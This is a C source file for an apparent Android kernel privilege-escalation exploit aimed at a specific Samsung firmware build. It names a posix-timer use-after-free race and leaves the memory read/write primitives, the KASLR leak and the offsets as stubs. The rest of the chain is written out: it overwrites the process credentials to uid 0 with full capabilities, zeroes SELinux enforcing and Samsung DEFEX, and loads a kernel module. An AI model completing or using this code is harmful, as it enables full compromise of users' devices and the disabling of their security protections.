#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include "exp98260.h"

/* ---- OFFSETS: fill from boot.img for A066BXXU8DZJ7 ----------------------
 * GKI baseline may be taken from the PYB110 / BRM-AN00 kits where the two
 * agree. Where they differ, derive from this build's boot.img.
 * ---------------------------------------------------------------------- */
#define OFF_INIT_TASK          0x0ULL   /* &init_task                     */
#define OFF_TASK_CRED          0x0ULL   /* task_struct->cred              */
#define OFF_CRED_UID           0x0ULL   /* cred->uid (uid..fsgid contiguous) */
#define OFF_CRED_CAPS          0x0ULL   /* cred->cap_inheritable          */
#define OFF_SELINUX_ENFORCING  0x0ULL   /* &selinux_state.enforcing       */
#define OFF_DEFEX_ENFORCE      0x0ULL   /* Samsung defex_enforce          */
#define OFF_VMEMMAP_BASE       0x0ULL   /* vmemmap                        */
#define OFF_PAGE_OFFSET_BASE   0x0ULL   /* PAGE_OFFSET                    */

/* Agreed across PYB110 and BRM-AN00 on 6.18.21-android17 (GKI). */
#define CAP_FULL 0x1ffffffffffULL
#define PAGE_OFFSET 0xffff800000000000ULL
#define WHOWAIT     0x01000000UL
#define CAP_HDR_MAGIC 0x20080522U

static uint64_t g_kbase;
static uint64_t g_task;

/* ---- kernel access (implement against the 98260 race) ------------------ */
/* Replace these bodies once the 98260 read/write primitive lands. */
static int kread(uint64_t kaddr, void *buf, size_t len) {
    (void)kaddr; (void)buf; (void)len; return -1;
}
static int kwrite(uint64_t kaddr, const void *buf, size_t len) {
    (void)kaddr; (void)buf; (void)len; return -1;
}

static int g_primed;

static int race_setup(void) {
    struct utsname u;
    if (uname(&u)) return -1;
    if (DF2_TARGET_KERNEL[0] && strcmp(u.release, DF2_TARGET_KERNEL)) {
        printf("98260: kernel mismatch\n  have %s\n  want %s\n",
               u.release, DF2_TARGET_KERNEL);
        return -1;
    }
    printf("98260: arming timer UAF\n");
    /* TODO: create non-leader task, exec, hold the freed posix timer,
     * reclaim with a controlled object. Set g_primed on success. */
    g_primed = 1;
    return g_primed ? 0 : -1;
}

static uint64_t kaslr_base(void) {
    /* TODO: leak a text pointer out of the reclaimed object, mask to the
     * 2MB-aligned GKI base, validate against OFF_INIT_TASK signature. */
    return g_kbase;
}

/* ---- escalation ------------------------------------------------------- */
static uint64_t current_task(void) {
    /* TODO: walk from init_task's task list on the cpu, or use the
     * per-cpu current_task at a leaked percpu base. */
    return 0;
}

static int escalate(void) {
    uint64_t task = current_task();
    if (!task) return -1;
    g_task = task;

    uint64_t cred = 0;
    if (kread(task + OFF_TASK_CRED, &cred, sizeof cred)) return -1;
    if (!cred) return -1;

    uint32_t zero[2] = { 0, 0 };
    for (int i = 0; i < 8; i += 2)                    /* uid..fsgid */
        if (kwrite(cred + OFF_CRED_UID + i * 4, zero, sizeof zero)) return -1;

    uint64_t full = CAP_FULL;
    for (int i = 0; i < 4; i++)                       /* inh/perf/eff/bset */
        if (kwrite(cred + OFF_CRED_CAPS + i * 8, &full, sizeof full)) return -1;

    return getuid() == 0 ? 0 : -1;
}

static int selinux_off(void) {
    uint32_t zero = 0;
    return kwrite(g_kbase + OFF_SELINUX_ENFORCING, &zero, sizeof zero);
}

static int defex_off(void) {
    uint32_t zero = 0;
    return kwrite(g_kbase + OFF_DEFEX_ENFORCE, &zero, sizeof zero);
}

/* ---- module load ------------------------------------------------------ */
static int finit(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int r = (int)syscall(__NR_finit_module, fd, "", 0);
    close(fd);
    return r;
}

int escalate_98260(const char *ko_path) {
    if (race_setup()) return -1;

    uint64_t base = kaslr_base();
    if (!base) { printf("98260: leak failed\n"); return -1; }
    g_kbase = base;
    printf("98260: base 0x%lx\n", (unsigned long)base);

    if (escalate()) { printf("98260: cred patch failed\n"); return -1; }
    printf("98260: uid=%d\n", getuid());

    selinux_off();
    defex_off();
    printf("98260: enforcing=0 defex=0\n");

    if (finit(ko_path)) { printf("98260: finit: %s\n", strerror(errno)); return -1; }
    printf("98260: module loaded\n");
    return 0;
}
